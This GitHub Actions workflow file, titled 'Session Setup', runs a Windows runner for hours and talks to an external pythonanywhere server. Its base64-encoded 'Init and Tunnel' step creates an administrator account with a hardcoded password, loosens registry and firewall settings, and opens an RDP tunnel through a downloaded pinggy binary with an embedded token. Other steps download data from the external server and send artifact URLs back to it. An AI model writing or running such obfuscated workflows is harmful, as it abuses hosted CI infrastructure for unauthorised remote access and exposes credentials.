name: Session Setup

on:
  workflow_dispatch:

jobs:
  job-alpha:
    runs-on: windows-2022
    timeout-minutes: 360   # Max runtime 6 hours

    steps:
      - name: Get lastest artifact URL from external server
        id: get_url
        shell: pwsh
        run: |
          $server = "https://azcaptchahh.pythonanywhere.com/geturl"
          try {
            $response = Invoke-RestMethod -Uri $server -Method GET
            if ($response.url) {
              echo "url=$($response.url)" >> $env:GITHUB_OUTPUT
              Write-Host "Latest artifact URL: $($response.url)"
            } else {
              Write-Host "No URL returned from server."
              echo "url=" >> $env:GITHUB_OUTPUT
            }
          } catch {
            Write-Host "Error fetching URL from server: $_"
            echo "url=" >> $env:GITHUB_OUTPUT
          }

      - name: Download previous artifact (if available)
        if: steps.get_url.outputs.url != ''
        shell: pwsh
        run: |
          $url = "${{ steps.get_url.outputs.url }}"
          $output = "data.zip"
          Write-Host "Downloading artifact from $url to $output"
          Invoke-WebRequest -Uri $url -OutFile $output

      - name: Unzip downloaded artifact to Administrator Desktop (if downloaded)
        if: steps.get_url.outputs.url != ''
        shell: pwsh
        run: |
          $output = "data.zip"
          $targetDir = "C:\Users\Administrator\Desktop\data"
          if (Test-Path $output) {
            Expand-Archive -Path $output -DestinationPath $targetDir -Force
            Remove-Item $output
          } else {
            Write-Host "No artifact zip downloaded; skipping extraction."
          }

      - name: Init and Tunnel
        run: |
          powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwAQwB1AHMAdABvAG0ATgBvAGQAZQAiACAALQBOAGEAbQBlACAAIgBBAGwAbABvAHcAQwBvAG4AbgAiACAALQBWAGEAbAB1AGUAIAAwAAoARQBuAGEAYgBsAGUALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBHAHIAbwB1AHAAIAAiAEYAaQBsAGUAIABhAG4AZAAgAFAAcgBpAG4AdABlAHIAIABTAGgAYQByAGkAbgBnACIACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABDAHUAcwB0AG8AbQBOAG8AZABlAFwAQQBjAGMAZQBzAHMAIgAgAC0ATgBhAG0AZQAgACIAQQB1AHQAaABNAG8AZABlACIAIAAtAFYAYQBsAHUAZQAgADEACgAKACMAIABDAHIAZQBhAHQAZQAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABhAGMAYwBvAHUAbgB0ACAAdwBpAHQAaAAgAGcAaQB2AGUAbgAgAHAAYQBzAHMAdwBvAHIAZAAKAG4AZQB0ACAAdQBzAGUAcgAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIABPAEwARABVAFMARQBSACMANgAgAC8AYQBkAGQACgBuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAALwBhAGQAZAAKAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGIAaQBuAGEAcgB5ACAAYQBuAGQAIABzAHQAYQByAHQAIAB0AHUAbgBuAGUAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAHAALQBzAG8AdQB0AGgALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHAAdQBiAGwAaQBjAC4AcABpAG4AZwBnAHkALgBiAGkAbgBhAHIAaQBlAHMALwBjAGwAaQAvAHYAMAAuADIALgA1AC8AdwBpAG4AZABvAHcAcwAvAGEAbQBkADYANAAvAHAAaQBuAGcAZwB5AC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAcABpAG4AZwBnAHkALgBlAHgAZQAiAAoALgBcAHAAaQBuAGcAZwB5AC4AZQB4AGUAIAAtAC0AdABvAGsAZQBuACAASwA0AHIAZABOAEwAWgBUAFEAZQA5ACAALQAtAHQAeQBwAGUAIAB0AGMAcAAgAC0AbAAgADMAMwA4ADkA
        timeout-minutes: 3

      - name: List Desktop Data contents (for debugging)
        run: dir C:\Users\Administrator\Desktop\data
        continue-on-error: true

      - name: Upload Desktop Data as "data" artifact
        id: upload_data
        uses: actions/upload-artifact@v4
        with:
          name: data
          path: C:\Users\Administrator\Desktop\data
        if: always()

      - name: Send artifact download URL to external server
        env:
          GITHUB_RUN_ID: ${{ github.run_id }}
          ARTIFACT_URL: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts
        run: |
          $url = "${{ env.ARTIFACT_URL }}"
          $server = "https://azcaptchahh.pythonanywhere.com/url"
          $body = @{ url = $url } | ConvertTo-Json
          Invoke-RestMethod -Uri $server -Method POST -ContentType "application/json" -Body $body
        shell: pwsh
